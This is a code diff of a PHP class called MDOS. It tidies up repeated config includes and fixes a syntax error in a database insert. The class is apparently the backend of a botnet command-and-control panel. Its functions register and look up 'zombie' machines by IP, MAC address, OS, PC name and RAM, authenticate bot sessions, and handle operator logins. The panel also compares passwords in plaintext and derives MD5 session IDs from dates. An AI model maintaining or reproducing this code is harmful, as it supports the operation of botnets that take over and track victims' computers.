@@ -1,7 +1,6 @@
 <?php
 	class MDOS {
 		function HTMLPrintIndex($error) {
-			include dirname(__FILE__).'/../static/config.php';
 			$fwd = dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/index.html';
 			$content = read_file($fwd);
 			$md_d1 = str_replace ("%url%", SYS_URL, $content);
@@ -16,7 +15,6 @@
 			echo $md_d2;
 		}
 		function HTMLPrintUser($info_sid, $info_log, $tab, $data = "") {
-			include dirname(__FILE__).'/../static/config.php';
 			$content = read_file (dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/user.html');
 			$tabcontent = read_file (dirname(__FILE__).'/../template/'.SYS_THEME.'/htmlcontent/user'.$tab.'.html');
 			$md_d1 = str_replace ("%tab%", $tabcontent, $content);
@@ -30,14 +28,12 @@
 			echo $md_d5;
 		}
 		function WriteLog ($ip, $type, $data) {
-			include dirname(__FILE__).'/../static/config.php';
 			$d_date = (date("d"))."/".(date("m"))." ".(date("H")).":".(date("i"));
 			$s_string = ($d_date.'|'.$type.'|'.$ip.'|'.$data);
 			$fpath = (dirname(__FILE__).'/../task/rawlog/rawlog.txt');
 			file_put_contents ($fpath, $s_string."\n", FILE_APPEND);
 		}
 		function DBTryConnect ($login, $passwd) {
-			include dirname(__FILE__).'/../static/config.php';
 			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
 			mysql_select_db(MYSQL_DB, $link);
 			$sql = "SELECT * FROM user_account WHERE login = '".(mysql_real_escape_string($login))."' AND password = '".(mysql_real_escape_string($passwd))."' ";
@@ -51,7 +47,6 @@
 			}
 		}
 		function DBGetMDP ($logx) {
-			include dirname(__FILE__).'/../static/config.php';
 			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
 			mysql_select_db(MYSQL_DB, $link);
 			$sql = "SELECT password FROM user_account WHERE login =  '".(mysql_real_escape_string($logx))."'";
@@ -61,7 +56,6 @@
 			return $result;
 		}
 		function DBCheckLog ($log) {
-			include dirname(__FILE__).'/../static/config.php';
 			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
 			mysql_select_db(MYSQL_DB, $link);
 			$sql = "SELECT * FROM user_account WHERE login = '".(mysql_real_escape_string($log))."'";
@@ -76,7 +70,6 @@
 		}
 		function SecureCheckSID ($sid, $mdp) {
 			$MDOS = new MDOS;
-			include dirname(__FILE__).'/../static/config.php';
 			$session = (date("z")).(date("d")).(date("g")).(date("f"));
 			$string = ($mdp.($MDOS -> RetrieveIP()).SYS_SALT.$session);
 			$subsid = md5($string);
@@ -90,7 +83,6 @@
 		}
 		function SecureCalcSID ($info_mdp) {
 			$MDOS = new MDOS;
-			include dirname(__FILE__).'/../static/config.php';
 			$session = (date("z")).(date("d")).(date("g")).(date("f"));
 			$string = ($info_mdp.($MDOS -> RetrieveIP()).SYS_SALT.$session);
 			$subsid = md5($string);
@@ -98,7 +90,6 @@
 			return $sid;
 		}
 		function SecureCheckZombSID ($sid) {
-			include dirname(__FILE__).'/../static/config.php';
 			$s = SYS_SALT;
 			$u = SYS_URL;
 			$string = ($s.(strrev($u))) ;
@@ -129,15 +120,13 @@
 			return $ip;
 		}
 		function ZombRegister ($a, $b, $c, $d, $e, $f, $g, $h, $i, $j) {
-			include dirname(__FILE__).'/../static/config.php';
 			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
 			mysql_select_db(MYSQL_DB, $link);
-			$sql = "INSERT INTO `".MYSQL_DB."`.`zomb_talk` (`ip`, `lang`, `localgateway`, `os`, `macadr`, `archetype`, `pcname`, `ram`, `sid`, `status`) VALUES ('".mysql_real_escape_string($a)."', '".mysql_real_escape_string($b)."', '".mysql_real_escape_string($c)."', '".mysql_real_escape_string($d)."', '".mysql_real_escape_string($e)."', '"mysql_real_escape_string($f)."', '".mysql_real_escape_string($g)."', '".mysql_real_escape_string($h)."', '".mysql_real_escape_string($i)."', '".mysql_real_escape_string($j)."');";
+			$sql = "INSERT INTO `".MYSQL_DB."`.`zomb_talk` (`ip`, `lang`, `localgateway`, `os`, `macadr`, `archetype`, `pcname`, `ram`, `sid`, `status`) VALUES ('".mysql_real_escape_string($a)."', '".mysql_real_escape_string($b)."', '".mysql_real_escape_string($c)."', '".mysql_real_escape_string($d)."', '".mysql_real_escape_string($e)."', '".mysql_real_escape_string($f)."', '".mysql_real_escape_string($g)."', '".mysql_real_escape_string($h)."', '".mysql_real_escape_string($i)."', '".mysql_real_escape_string($j)."')";
 			$query = mysql_query($sql);
 			mysql_close($link);
 		}
 		function ZombExists ($entry) {
-			include dirname(__FILE__).'/../static/config.php';
 			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
 			mysql_select_db(MYSQL_DB, $link);
 			$sql = "SELECT * FROM zomb_talk WHERE macadr = '".(mysql_real_escape_string($entry))."'";
